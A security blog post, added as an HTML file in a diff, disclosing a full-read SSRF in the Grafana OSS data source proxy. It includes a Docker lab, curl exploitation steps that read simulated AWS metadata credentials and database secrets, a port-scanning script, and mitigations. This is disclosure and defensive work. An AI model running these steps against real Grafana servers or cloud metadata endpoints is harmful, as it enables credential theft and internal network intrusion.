@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grafana OSS - Full Read SSRF via Data Source Proxy - ribeir.in</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../"></div>
+
+        <main>
+            <article class="content">
+                <h1>Grafana OSS - Full Read SSRF via Data Source Proxy</h1>
+
+                <div class="post-meta" style="margin-bottom: 30px;">
+                    [2026-03-24] | Author: ribeirin | Reading time: 15 min
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">ssrf</span>
+                    <span class="tag">grafana</span>
+                    <span class="tag">data source proxy</span>
+                    <span class="tag">cloud metadata</span>
+                    <span class="tag">misconfiguration</span>
+                </div>
+
+                <h2>## Abstract</h2>
+
+                <p>
+                    Grafana is the most popular open-source monitoring and observability platform, used by
+                    thousands of organizations to visualize metrics, logs, and traces. During security research
+                    on the Grafana OSS codebase, I identified a <strong>full read Server-Side Request Forgery
+                    (SSRF)</strong> vulnerability in the data source proxy. An authenticated user with data source
+                    creation permissions can configure a data source pointing to any internal URL, and the proxy
+                    returns the <strong>complete response body</strong> &mdash; making it trivial to steal cloud
+                    metadata credentials, read internal APIs, and map the internal network.
+                </p>
+
+                <p>
+                    This is possible because of two compounding issues in Grafana OSS: the URL validator is a
+                    <strong>no-op</strong> that always returns <code>nil</code>, and the data source proxy whitelist
+                    is <strong>empty by default</strong>, which causes the whitelist check to be completely skipped.
+                </p>
+
+                <h2>## Is This a Vulnerability or a Misconfiguration?</h2>
+
+                <p>
+                    This is a fair question. The answer is: <strong>it's both</strong>.
+                </p>
+
+                <p>
+                    Grafana OSS intentionally ships with a no-op URL validator. The Enterprise version
+                    has actual validation logic. The data source proxy whitelist exists as a configuration
+                    option (<code>data_source_proxy_whitelist</code>) but is empty by default, and the code is
+                    written so that an empty whitelist means <strong>allow everything</strong>. This is a
+                    design decision, not an accidental bug.
+                </p>
+
+                <p>
+                    However, this creates a dangerous default: every Grafana OSS instance deployed in a cloud
+                    environment (AWS, GCP, Azure) with the default configuration is vulnerable to SSRF from any
+                    user that can create data sources. Most organizations deploying Grafana don't know that this
+                    whitelist exists or that it needs to be configured. The secure-by-default principle says that
+                    the default configuration should be safe &mdash; and this one isn't.
+                </p>
+
+                <p>
+                    Regardless of how you classify it, the impact is real: <strong>full read access to internal
+                    network services from the Grafana server's network context</strong>.
+                </p>
+
+                <h2>## The Problem in Code</h2>
+
+                <h3>### Problem 1: No-op URL Validator (OSS)</h3>
+
+                <p>
+                    The Grafana OSS build includes a URL validator that does literally nothing. Both the
+                    request validator and the URL validator always return <code>nil</code>:
+                </p>
+
+                <pre><code>// pkg/services/validations/oss.go
+
+type OSSDataSourceRequestValidator struct{}
+
+func (*OSSDataSourceRequestValidator) Validate(string, *simplejson.Json, *http.Request) error {
+    return nil  // Always passes - zero validation
+}
+
+type OSSDataSourceRequestURLValidator struct{}
+
+func (*OSSDataSourceRequestURLValidator) Validate(string) error {
+    return nil  // Always passes - zero URL validation
+}</code></pre>
+
+                <p>
+                    This is the entire file. There is no IP range check, no hostname check, no protocol check.
+                    The Grafana Enterprise build replaces this with actual validation logic, but the OSS version
+                    &mdash; which is what most people deploy &mdash; has nothing.
+                </p>
+
+                <h3>### Problem 2: Empty Whitelist = Allow Everything</h3>
+
+                <p>
+                    The data source proxy has a whitelist check, but its logic is inverted for the default case:
+                </p>
+
+                <pre><code>// pkg/api/pluginproxy/ds_proxy.go:402-411
+
+func (proxy *DataSourceProxy) checkWhiteList() bool {
+    if proxy.targetUrl.Host != "" && len(proxy.cfg.DataProxyWhiteList) > 0 {
+        if _, exists := proxy.cfg.DataProxyWhiteList[proxy.targetUrl.Host]; !exists {
+            proxy.ctx.JsonApiErr(403, "Data proxy hostname and ip are not included in whitelist", nil)
+            return false
+        }
+    }
+
+    return true  // Empty whitelist = allow everything
+}</code></pre>
+
+                <p>
+                    The whitelist is only enforced when <code>len(proxy.cfg.DataProxyWhiteList) > 0</code>.
+                    When the whitelist is empty (the default), the entire check is skipped and the function
+                    returns <code>true</code> (allowed).
+                </p>
+
+                <p>The default configuration in <code>conf/defaults.ini</code>:</p>
+
+                <pre><code># conf/defaults.ini:398-399
+
+# data source proxy whitelist (ip_or_domain:port separated by spaces)
+data_source_proxy_whitelist =</code></pre>
+
+                <p>
+                    Empty. Out of the box, every Grafana OSS instance allows proxying to any host.
+                </p>
+
+                <h3>### Problem 3: URL Validation Only Checks Format</h3>
+
+                <p>
+                    When creating a data source, the URL goes through <code>ValidateURL()</code>, but this
+                    function only checks that the URL is syntactically valid (has a protocol, parses correctly).
+                    It does <strong>not</strong> check if the URL points to a private IP range or cloud metadata
+                    endpoint:
+                </p>
+
+                <pre><code>// pkg/api/datasource/validation.go:63
+
+func ValidateURL(typeName, urlStr string) (*url.URL, error) {
+    // Only checks: is URL empty? does it have a protocol? does it parse?
+    // Does NOT check: is the host a private IP? is it a cloud metadata endpoint?
+    if !reURL.MatchString(urlStr) {
+        urlStr = "http://" + urlStr
+    }
+    u, err = url.Parse(urlStr)
+    // ...
+    return u, nil
+}</code></pre>
+
+                <h3>### The Proxy: Full Reverse Proxy with Response Passthrough</h3>
+
+                <p>
+                    The data source proxy is a full HTTP reverse proxy. It forwards the request and returns the
+                    <strong>complete response body</strong> to the caller:
+                </p>
+
+                <pre><code>// pkg/api/pluginproxy/ds_proxy.go:91-162
+
+func (proxy *DataSourceProxy) HandleRequest() {
+    if err := proxy.validateRequest(); err != nil {
+        proxy.ctx.JsonApiErr(403, err.Error(), nil)
+        return
+    }
+
+    // Get transport (no IP validation here either)
+    transport, err := proxy.dataSourcesService.GetHTTPTransport(...)
+
+    // Create reverse proxy - forwards request to target and returns response
+    reverseProxy := proxyutil.NewReverseProxy(
+        proxyErrorLogger,
+        proxy.director,
+        proxyutil.WithTransport(transport),
+        proxyutil.WithModifyResponse(modifyResponse),
+    )
+
+    // Serve - full response body is returned to the attacker
+    reverseProxy.ServeHTTP(proxy.ctx.Resp, proxy.ctx.Req)
+}</code></pre>
+
+                <p>
+                    This is what makes this a <strong>full read SSRF</strong>, not a blind SSRF. The attacker
+                    gets the complete HTTP response from the internal service, including headers and body.
+                </p>
+
+                <h2>## Prerequisites</h2>
+
+                <ul>
+                    <li><strong>Grafana OSS</strong> (any version &mdash; the no-op validator has existed since the OSS/Enterprise split)</li>
+                    <li><strong>Default configuration</strong> (<code>data_source_proxy_whitelist</code> not set, which is the default)</li>
+                    <li><strong>Admin role</strong> (by default) or any user with <code>datasources:create</code> and
+                        <code>datasources:query</code> RBAC permissions</li>
+                    <li>The Grafana server must be deployed in a network with internal services reachable
+                        (cloud VPC, Kubernetes cluster, Docker network, etc.)</li>
+                </ul>
+
+                <p>
+                    <strong>Note on Grafana Enterprise:</strong> The Enterprise build has actual URL validators
+                    (<code>OSSDataSourceRequestURLValidator</code> is replaced with a real implementation).
+                    This issue is specific to Grafana OSS.
+                </p>
+
+                <h2>## Lab Setup</h2>
+
+                <p>
+                    The following Docker Compose lab demonstrates the vulnerability with a simulated internal
+                    service containing sensitive data.
+                </p>
+
+                <h3>### 1. Create the project structure</h3>
+
+                <pre><code>mkdir grafana-ssrf-lab && cd grafana-ssrf-lab</code></pre>
+
+                <h3>### 2. Create <code>internal_service.py</code></h3>
+
+                <p>
+                    This simulates an internal service (cloud metadata endpoint, secret manager, internal API)
+                    that contains sensitive data and should only be accessible within the network:
+                </p>
+
+                <pre><code>#!/usr/bin/env python3
+"""Simulates an internal service with sensitive data (e.g., cloud metadata)"""
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+
+        # Simulate different internal endpoints
+        if self.path == '/latest/meta-data/iam/security-credentials/grafana-role':
+            # Simulated AWS IMDSv1 response
+            data = {
+                'Code': 'Success',
+                'Type': 'AWS-HMAC',
+                'AccessKeyId': 'AKIAIOSFODNN7EXAMPLE',
+                'SecretAccessKey': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
+                'Token': 'IQoJb3JpZ2luX2VjEBAaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAJ...',
+                'Expiration': '2026-03-25T00:00:00Z'
+            }
+        elif self.path == '/api/v1/secrets/database':
+            # Simulated internal secret manager
+            data = {
+                'secret_name': 'production-database',
+                'username': 'db_admin',
+                'password': 'S3cureP@ssw0rd!2026',
+                'host': 'prod-db.internal:5432',
+                'database': 'customers'
+            }
+        else:
+            data = {
+                'service': 'INTERNAL-SECRET-SERVICE',
+                'path': self.path,
+                'message': 'THIS DATA SHOULD NOT BE ACCESSIBLE FROM OUTSIDE',
+                'internal_ip': '10.0.1.50',
+                'environment': 'production'
+            }
+        self.wfile.write(json.dumps(data, indent=2).encode())
+
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_length)
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        print(f'[HIT] POST {self.path}', flush=True)
+        print(f'[HIT] Body: {body.decode()[:500]}', flush=True)
+        self.wfile.write(b'{"status": "ok"}')
+
+    def log_message(self, format, *args):
+        print(f'[INTERNAL-SERVICE] {format % args}', flush=True)
+
+if __name__ == '__main__':
+    print('Internal service listening on port 8080...', flush=True)
+    HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()</code></pre>
+
+                <h3>### 3. Create <code>docker-compose.yml</code></h3>
+
+                <pre><code>services:
+  grafana:
+    image: grafana/grafana-oss:latest
+    container_name: grafana-lab
+    ports:
+      - "3000:3000"
+    environment:
+      - GF_SECURITY_ADMIN_USER=admin
+      - GF_SECURITY_ADMIN_PASSWORD=admin
+    networks:
+      - lab-network
+    depends_on:
+      - internal-service
+
+  internal-service:
+    image: python:3.12-slim
+    container_name: internal-service
+    volumes:
+      - ./internal_service.py:/app/server.py:ro
+    command: python3 /app/server.py
+    networks:
+      - lab-network
+    # No ports exposed - only accessible within the Docker network
+
+networks:
+  lab-network:
+    driver: bridge</code></pre>
+
+                <h3>### 4. Start the lab</h3>
+
+                <pre><code>$ docker compose up -d
+[+] Running 3/3
+ ✔ Network grafana-ssrf-lab_lab-network  Created
+ ✔ Container internal-service            Started
+ ✔ Container grafana-lab                 Started</code></pre>
+
+                <h3>### 5. Verify the setup</h3>
+
+                <pre><code># Grafana is up
+$ curl -s http://localhost:3000/api/health | jq .
+{
+  "commit": "...",
+  "database": "ok",
+  "version": "12.4.1"
+}
+
+# Internal service is reachable FROM Grafana's network
+$ docker exec grafana-lab curl -s http://internal-service:8080/
+{
+  "service": "INTERNAL-SECRET-SERVICE",
+  "path": "/",
+  "message": "THIS DATA SHOULD NOT BE ACCESSIBLE FROM OUTSIDE",
+  ...
+}
+
+# But NOT reachable from the host machine
+$ curl -s --max-time 2 http://internal-service:8080/ 2>&1
+curl: (6) Could not resolve host: internal-service</code></pre>
+
+                <h2>## Exploitation</h2>
+
+                <h3>### Step 1: Create a data source pointing to the internal service</h3>
+
+                <p>
+                    Register a new Prometheus data source with the URL set to the internal service.
+                    The data source type doesn't matter much &mdash; the proxy will forward any request
+                    regardless of type.
+                </p>
+
+                <pre><code>$ DS_RESPONSE=$(curl -s -X POST http://localhost:3000/api/datasources \
+  -u admin:admin \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name": "SSRF-Target",
+    "type": "prometheus",
+    "url": "http://internal-service:8080",
+    "access": "proxy",
+    "isDefault": false
+  }')
+
+$ DS_ID=$(echo $DS_RESPONSE | jq -r '.datasource.id // .id')
+$ DS_UID=$(echo $DS_RESPONSE | jq -r '.datasource.uid // .uid')
+$ echo "Data Source ID: $DS_ID / UID: $DS_UID"
+Data Source ID: 2 / UID: fe4k7z1234abc</code></pre>
+
+                <p>
+                    Grafana accepts this without complaint. The no-op URL validator returns <code>nil</code>,
+                    and the empty whitelist allows everything.
+                </p>
+
+                <h3>### Step 2: Read internal service data via the proxy</h3>
+
+                <p>
+                    Now use the data source proxy endpoint. The path after <code>/proxy/{id}/</code> is
+                    appended to the data source URL and the <strong>full response body is returned</strong>:
+                </p>
+
+                <pre><code># Read the default endpoint
+$ curl -s -u admin:admin \
+  "http://localhost:3000/api/datasources/proxy/$DS_ID/"
+
+{
+  "service": "INTERNAL-SECRET-SERVICE",
+  "path": "/",
+  "message": "THIS DATA SHOULD NOT BE ACCESSIBLE FROM OUTSIDE",
+  "internal_ip": "10.0.1.50",
+  "environment": "production"
+}</code></pre>
+
+                <p>
+                    The full response from the internal service is returned to us.
+                    We can hit any path on the internal service:
+                </p>
+
+                <pre><code># Simulate AWS IMDSv1 credential theft
+$ curl -s -u admin:admin \
+  "http://localhost:3000/api/datasources/proxy/$DS_ID/latest/meta-data/iam/security-credentials/grafana-role"
+
+{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "IQoJb3JpZ2luX2VjEBAaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAJ...",
+  "Expiration": "2026-03-25T00:00:00Z"
+}</code></pre>
+
+                <pre><code># Read internal secret manager
+$ curl -s -u admin:admin \
+  "http://localhost:3000/api/datasources/proxy/$DS_ID/api/v1/secrets/database"
+
+{
+  "secret_name": "production-database",
+  "username": "db_admin",
+  "password": "S3cureP@ssw0rd!2026",
+  "host": "prod-db.internal:5432",
+  "database": "customers"
+}</code></pre>
+
+                <h3>### Step 3: Same attack via UID-based endpoint</h3>
+
+                <pre><code># Works with UID too
+$ curl -s -u admin:admin \
+  "http://localhost:3000/api/datasources/proxy/uid/$DS_UID/api/v1/secrets/database"
+
+{
+  "secret_name": "production-database",
+  "username": "db_admin",
+  "password": "S3cureP@ssw0rd!2026",
+  ...
+}</code></pre>
+
+                <h3>### Step 4: Internal port scanning</h3>
+
+                <p>
+                    Open ports return the service response (HTTP 200), closed ports return HTTP 502 from
+                    the Grafana proxy. This enables internal network mapping:
+                </p>
+
+                <pre><code>#!/bin/bash
+# port_scan.sh - Scan internal ports via Grafana data source proxy SSRF
+
+TARGET="internal-service"
+GRAFANA="http://localhost:3000"
+AUTH="admin:admin"
+
+for PORT in 22 80 443 3306 5432 6379 8080 8443 9090 9200 27017; do
+  # Create a data source for each port
+  DS_ID=$(curl -s -X POST "$GRAFANA/api/datasources" \
+    -u "$AUTH" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "name": "scan-'"$PORT"'",
+      "type": "prometheus",
+      "url": "http://'"$TARGET"':'"$PORT"'",
+      "access": "proxy"
+    }' | jq -r '.datasource.id // .id')
+
+  # Probe through the proxy
+  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
+    -u "$AUTH" \
+    "$GRAFANA/api/datasources/proxy/$DS_ID/" 2>/dev/null)
+
+  if [ "$HTTP_CODE" = "200" ]; then
+    echo "Port $PORT: OPEN (HTTP $HTTP_CODE)"
+  else
+    echo "Port $PORT: closed (HTTP $HTTP_CODE)"
+  fi
+
+  # Cleanup
+  curl -s -X DELETE "$GRAFANA/api/datasources/$DS_ID" -u "$AUTH" > /dev/null
+done</code></pre>
+
+                <pre><code>$ bash port_scan.sh
+Port 22: closed (HTTP 502)
+Port 80: closed (HTTP 502)
+Port 443: closed (HTTP 502)
+Port 3306: closed (HTTP 502)
+Port 5432: closed (HTTP 502)
+Port 6379: closed (HTTP 502)
+Port 8080: OPEN (HTTP 200)      &lt;-- internal service found!
+Port 8443: closed (HTTP 502)
+Port 9090: closed (HTTP 502)
+Port 9200: closed (HTTP 502)
+Port 27017: closed (HTTP 502)</code></pre>
+
+                <h2>## Why This is Dangerous</h2>
+
+                <p>
+                    Unlike blind SSRF where the attacker can only observe side-channel information (timing,
+                    error messages), this is a <strong>full read SSRF</strong>. The attacker receives the
+                    <strong>complete HTTP response</strong> from the target service:
+                </p>
+
+                <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+                    <tr>
+                        <th style="text-align: left; padding: 10px; border-bottom: 1px solid var(--text-dim);">Aspect</th>
+                        <th style="text-align: left; padding: 10px; border-bottom: 1px solid var(--text-dim);">Blind SSRF</th>
+                        <th style="text-align: left; padding: 10px; border-bottom: 1px solid var(--text-dim);">This (Full Read SSRF)</th>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">Response visible</td>
+                        <td style="padding: 10px;">No</td>
+                        <td style="padding: 10px;"><strong>Yes - complete body + headers</strong></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">Data exfiltration</td>
+                        <td style="padding: 10px;">Side-channels only</td>
+                        <td style="padding: 10px;"><strong>Direct - full response returned</strong></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">Trigger</td>
+                        <td style="padding: 10px;">Often requires waiting</td>
+                        <td style="padding: 10px;"><strong>Instant, on-demand</strong></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">HTTP methods</td>
+                        <td style="padding: 10px;">Usually limited</td>
+                        <td style="padding: 10px;"><strong>GET, POST, PUT, DELETE</strong></td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 10px;">Cloud credential theft</td>
+                        <td style="padding: 10px;">Difficult to extract</td>
+                        <td style="padding: 10px;"><strong>Trivial - just read the response</strong></td>
+                    </tr>
+                </table>
+
+                <h2>## Real-World Impact</h2>
+
+                <ul>
+                    <li>
+                        <strong>AWS/GCP/Azure credential theft:</strong> Create a data source pointing to
+                        <code>http://169.254.169.254</code> (AWS IMDSv1) or
+                        <code>http://metadata.google.internal</code> (GCP). Read the full IAM credential
+                        JSON response including AccessKeyId, SecretAccessKey, and session Token. This leads
+                        to full cloud account compromise if the instance role has broad permissions.
+                    </li>
+                    <li>
+                        <strong>Kubernetes secret access:</strong> Point to
+                        <code>https://kubernetes.default.svc/api/v1/namespaces/default/secrets</code>.
+                        If the Grafana pod has a service account with permissions, you can read all secrets
+                        in the cluster.
+                    </li>
+                    <li>
+                        <strong>Internal API data exfiltration:</strong> Read responses from internal REST
+                        APIs, databases with HTTP interfaces (Elasticsearch, CouchDB, Consul), and other
+                        services that don't require authentication from within the trusted network.
+                    </li>
+                    <li>
+                        <strong>Internal network mapping:</strong> Differentiate open (HTTP 200) from closed
+                        (HTTP 502) ports to discover running services and their network topology.
+                    </li>
+                </ul>
+
+                <h2>## Affected Versions</h2>
+
+                <ul>
+                    <li>All Grafana OSS versions (the no-op validator has existed since the OSS/Enterprise split)</li>
+                    <li>Confirmed on Grafana OSS v12.4.1 and current main branch</li>
+                    <li>Grafana Enterprise is <strong>not affected</strong> (has actual URL validators)</li>
+                </ul>
+
+                <h2>## Mitigation</h2>
+
+                <p>
+                    If you're running Grafana OSS, you can mitigate this by configuring the data source
+                    proxy whitelist in your <code>grafana.ini</code> / <code>custom.ini</code>:
+                </p>
+
+                <pre><code>[security]
+# Only allow proxying to these specific hosts
+data_source_proxy_whitelist = prometheus.internal:9090 elasticsearch.internal:9200</code></pre>
+
+                <p>
+                    This forces the whitelist check in <code>checkWhiteList()</code> to actually evaluate
+                    the target host against the allowed list. Any data source URL not matching a whitelisted
+                    host will be rejected with HTTP 403.
+                </p>
+
+                <p>For a proper fix in the codebase, Grafana should:</p>
+
+                <ol>
+                    <li>Implement actual URL validation in <code>OSSDataSourceRequestURLValidator.Validate()</code>
+                        instead of returning <code>nil</code></li>
+                    <li>Add a <code>SafeDialer</code> to the data source proxy HTTP transport that blocks
+                        private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and
+                        cloud metadata endpoints (169.254.169.254) at the TCP connection level:
+
+                <pre><code>// Recommended: SafeDialer with IP validation in the transport
+transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+    host, _, _ := net.SplitHostPort(addr)
+    ip := net.ParseIP(host)
+    if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
+        return nil, fmt.Errorf("blocked: request to private IP %s", ip)
+    }
+    if ip.Equal(net.ParseIP("169.254.169.254")) {
+        return nil, fmt.Errorf("blocked: request to cloud metadata endpoint")
+    }
+    return (&net.Dialer{Timeout: 30 * time.Second}).DialContext(ctx, network, addr)
+}</code></pre>
+                    </li>
+                    <li>Invert the whitelist logic so that an empty whitelist <strong>denies</strong> all
+                        instead of allowing all, or require explicit configuration</li>
+                    <li>Add a warning in the Grafana UI when a data source URL resolves to a private IP range</li>
+                </ol>
+
+                <h2>## References</h2>
+
+                <ul>
+                    <li><a href="https://grafana.com/docs/grafana/latest/datasources/" target="_blank">Grafana - Data sources documentation</a></li>
+                    <li><a href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#data_source_proxy_whitelist" target="_blank">Grafana - data_source_proxy_whitelist configuration</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank">OWASP - Server Side Request Forgery</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP - SSRF Prevention Cheat Sheet</a></li>
+                    <li><a href="https://cwe.mitre.org/data/definitions/918.html" target="_blank">CWE-918: Server-Side Request Forgery</a></li>
+                    <li><a href="https://github.com/grafana/grafana" target="_blank">Grafana OSS GitHub Repository</a></li>
+                    <li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html" target="_blank">AWS - Instance metadata retrieval</a></li>
+                </ul>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">Grafana OSS // Full Read SSRF</div>
+                    <div class="eof-author">ribeirin</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../posts.html">&lt;&lt; Back to Posts</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../"></div>
+    </div>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
